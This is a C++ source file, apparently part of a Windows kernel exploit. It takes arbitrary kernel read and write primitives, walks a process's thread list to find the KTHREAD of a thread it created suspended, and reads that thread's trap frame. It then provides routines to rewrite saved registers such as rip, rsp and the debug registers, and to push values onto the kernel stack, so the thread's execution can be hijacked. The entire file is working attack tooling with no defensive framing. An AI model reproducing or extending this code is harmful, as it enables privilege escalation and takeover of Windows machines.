#include "framemanager.h"
#include "offsets.h"




FrameManager::FrameManager()
    : threadHandle(nullptr), threadId(0), frameAddress(0), kthreadAddress(0), eprocess(0), threadReady(false)
{}

void FrameManager::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn) {
    readFn = fn;
}

void FrameManager::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn) {
    writeFn = fn;
}

void FrameManager::SetEPROCESS(UINT64 ep) {
    eprocess = ep;
}


DWORD WINAPI FrameManager::DummyThreadProc(LPVOID) {
    return 0;
}

UINT64 FrameManager::FindKthread() {
    if (!eprocess) {
        DbgLog("[FindKthread] FAIL: eprocess not set\n");
        return 0;
    }
    if (!readFn) {
        DbgLog("[FindKthread] FAIL: readFn not set\n");
        return 0;
    }
	if (!threadId) {
		DbgLog("[FindKthread] FAIL: thread not created\n");
		return 0;
	}

    UINT64 listHead = eprocess + OFF_EPROCESS_THREAD_LIST_HEAD;
    if (!IsValidKernelAddress(listHead)) {
        DbgLog("[FindKthread] FAIL: listHead=0x%llX is not a valid kernel address\n", listHead);
        return 0;
    }


    UINT64 flink = 0;
    readFn(&flink, listHead, sizeof(UINT64));


    UINT64 current = flink;
    for (int i = 0; i < 4096; i++) {
        if (!current || current == listHead) {
            DbgLog("[FindKthread] FAIL: walked full list (%d entries), tid=%lu not found\n", i, threadId);
            return 0;
        }

        UINT64 ethread = current - OFF_ETHREAD_THREAD_LIST_HEAD;
        if (!IsValidKernelAddress(ethread)) {
            DbgLog("[FindKthread] FAIL: ethread=0x%llX invalid at entry %d\n", ethread, i);
            return 0;
        }

        UINT64 tid = 0;
        readFn(&tid, ethread + OFF_CID_UNIQUE_THREAD, sizeof(UINT64));

        if ((DWORD)tid == threadId) {
            kthreadAddress = ethread;
            return ethread;
        }

        UINT64 nextFlink = 0;
        readFn(&nextFlink, current, sizeof(UINT64));
        if (!IsValidKernelAddress(nextFlink)) {
            DbgLog("[FindKthread] FAIL: nextFlink=0x%llX invalid at entry %d\n", nextFlink, i);
            return 0;
        }
        current = nextFlink;
    }

    DbgLog("[FindKthread] FAIL: hit 4096 entry limit\n");

    return 0;
}

void FrameManager::CreateFrozenThread() {
    if (threadReady) return; // reuse existing thread and frame

    DWORD dwTid = 0;
    threadHandle = CreateThread(NULL, 0, DummyThreadProc, NULL, CREATE_SUSPENDED, &dwTid);

    if (!threadHandle) {
        DbgLog("[CreateFrozenThread] FAIL: CreateThread failed GLE=%lu\n", GetLastError());
        return;
    }
    threadId = dwTid;
    DbgLog("[CreateFrozenThread] tid=%lu\n", dwTid);
    StoreFrame();
    if (frameAddress) threadReady = true;
}

void FrameManager::StoreFrame() {
    if (!readFn) {
        DbgLog("[StoreFrame] FAIL: readFn not set\n");
        return;
    }

    UINT64 kthread = FindKthread();
    if (!kthread) {
        DbgLog("[StoreFrame] FAIL: FindKthread returned 0\n");
        return;
    }

    frameAddress = 0;
    UINT64 trapFrameAddr = kthread + OFF_KTHREAD_TRAP_FRAME;
    if (!IsValidKernelAddress(trapFrameAddr)) {
        DbgLog("[StoreFrame] FAIL: trapFrameAddr=0x%llX invalid\n", trapFrameAddr);
        return;
    }
    readFn(&frameAddress, trapFrameAddr, sizeof(UINT64));


    if (!frameAddress) {
        DbgLog("[StoreFrame] WARN: frameAddress is 0, trap frame may not be set yet\n");
    }

    static const std::vector<std::string> kRegisters = {
        "rax", "rcx", "rdx", "r8",  "r9",  "r10", "r11",
        "rbx", "rdi", "rsi", "rbp", "rsp", "rip",
        "eflags", "mxcsr", "gsbase",
        "segcs", "segss", "segds", "seges", "segfs", "seggs",
        "xmm0", "xmm1", "xmm2", "xmm3", "xmm4", "xmm5",
        "dr0",  "dr1",  "dr2",  "dr3",  "dr6",  "dr7", "debugcontrol"
    };

    storedRegisters.clear();
    for (const auto& reg : kRegisters) {
        UINT64 offset = GetKtrapFrameRegisterOffset(reg);
        UINT64 regAddr = frameAddress + offset;
        if (!IsValidKernelAddress(regAddr)) {
            DbgLog("[StoreFrame] SKIP: %s addr=0x%llX invalid\n", reg.c_str(), regAddr);
            storedRegisters[reg] = 0;
            continue;
        }
        UINT64 val = 0;
        readFn(&val, regAddr, sizeof(UINT64));
        storedRegisters[reg] = val;
    }
    DbgLog("[StoreFrame] frame=0x%llX kthread=0x%llX\n", frameAddress, kthreadAddress);
}

void FrameManager::ContinueThread() {
    if (threadHandle) {
        ResumeThread(threadHandle);
        CloseHandle(threadHandle);
        threadHandle = nullptr;
        threadId     = 0;
        frameAddress = 0;
        kthreadAddress = 0;
        threadReady  = false;
    }
}

void FrameManager::PushStack(UINT64 value) {
    if (!writeFn || !frameAddress) {
        DbgLog("[PushStack] FAIL: %s\n", !writeFn ? "no writeFn" : "frameAddress is 0");
        return;
    }

    UINT64 rsp = ReadRegister("rsp");
    if (rsp == UINT64_MAX) {
        DbgLog("[PushStack] FAIL: could not read rsp\n");
        return;
    }

    rsp -= sizeof(UINT64);

    if (!IsValidKernelAddress(rsp)) {
        DbgLog("[PushStack] FAIL: new rsp=0x%llX is not a valid kernel address\n", rsp);
        return;
    }

    writeFn(rsp, value);
    WriteRegister("rsp", rsp);
    DbgLog("[PushStack] pushed 0x%llX -> rsp=0x%llX\n", value, rsp);
}


UINT64 FrameManager::ReadStoredRegister(std::string regName) {
    std::transform(regName.begin(), regName.end(), regName.begin(),
        [](unsigned char c){ return std::tolower(c); });

    auto it = storedRegisters.find(regName);
    if (it == storedRegisters.end()) {
        DbgLog("[ReadStoredRegister] FAIL: '%s' not in stored map\n", regName.c_str());
        return UINT64_MAX;
    }
    return it->second;
}

UINT64 FrameManager::ReadRegister(std::string regName) {
    UINT64 offset = GetKtrapFrameRegisterOffset(regName);
    if (offset == UINT64_MAX) {
        DbgLog("[ReadRegister] FAIL: unknown register '%s'\n", regName.c_str());
        return UINT64_MAX;
    }
    if (!readFn) {
        DbgLog("[ReadRegister] FAIL: readFn not set\n");
        return UINT64_MAX;
    }
    if (!frameAddress) {
        DbgLog("[ReadRegister] FAIL: frameAddress is 0\n");
        return UINT64_MAX;
    }
    UINT64 regAddr = frameAddress + offset;
    if (!IsValidKernelAddress(regAddr)) {
        DbgLog("[ReadRegister] FAIL: addr=0x%llX invalid\n", regAddr);
        return UINT64_MAX;
    }
    UINT64 val = 0;
    readFn(&val, regAddr, sizeof(UINT64));
    return val;
}

void FrameManager::WriteRegister(std::string regName, UINT64 value) {
    UINT64 offset = GetKtrapFrameRegisterOffset(regName);
    if (offset == UINT64_MAX) {
        DbgLog("[WriteRegister] FAIL: unknown register '%s'\n", regName.c_str());
        return;
    }
    if (!writeFn) {
        DbgLog("[WriteRegister] FAIL: writeFn not set\n");
        return;
    }
    if (!frameAddress) {
        DbgLog("[WriteRegister] FAIL: frameAddress is 0\n");
        return;
    }
    UINT64 regAddr = frameAddress + offset;
    if (!IsValidKernelAddress(regAddr)) {
        DbgLog("[WriteRegister] FAIL: addr=0x%llX invalid\n", regAddr);
        return;
    }
    writeFn(regAddr, value);
}

UINT64 FrameManager::GetFrameAddress() const {
    return frameAddress;
}

UINT64 FrameManager::GetKthreadAddress() {
    return kthreadAddress;
}
